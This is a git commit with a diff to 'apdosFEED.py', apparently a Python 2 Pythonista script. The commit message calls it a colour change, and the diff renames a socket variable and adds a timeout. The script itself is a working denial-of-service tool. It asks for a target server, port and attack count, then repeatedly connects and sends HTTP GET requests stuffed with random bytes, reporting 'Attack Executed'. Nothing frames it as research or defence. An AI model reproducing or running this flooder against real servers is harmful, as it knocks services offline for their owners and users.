1f48f1495332282c94b216cdf1190d5d3cb5652a
RussianOtter <elangs321@gmail.com>
2016-12-23 23:26:54 -0500

    Update apdosFEED.py
    Color changes

--- apdosFEED.py
+++ apdosFEED.py
@@ -9,23 +9,24 @@ console.set_color()
 host=raw_input(" -+- Server: ")
 port=int(input(" -+- Port: "))
 message=random._urandom(1024)
-conn=input( " -+- Attacks:" )
+conn=input( " -+- Attacks: " )
+print ""
 ip = socket.gethostbyname( host )
 def dos():
-	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	socket.setdefaulttimeout(4)
 	try:
-		ddos.connect((host, int(port)))
-		ddos.send( "GET /%s HTTP/1.1\r\n" % message )
-		ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
-		ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+		s.connect((host, int(port)))
+		s.send( "GET /%s HTTP/1.1\r\n" % message )
+		s.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
+		s.send( "GET /%s HTTP/1.1\r\n" % message )
 	except socket.error, msg:
 		console.set_color(255, 0, 0)
 		print("-[Connection Failed]-=@=--+-")
 		console.set_color()
 	else:
-		console.set_color(0, 130, 0)
 		print ( "-[Attack Executed]-=:=--+-")
 	console.set_color()
-	ddos.close()
+	s.close()
 for i in xrange(conn):
 	dos()
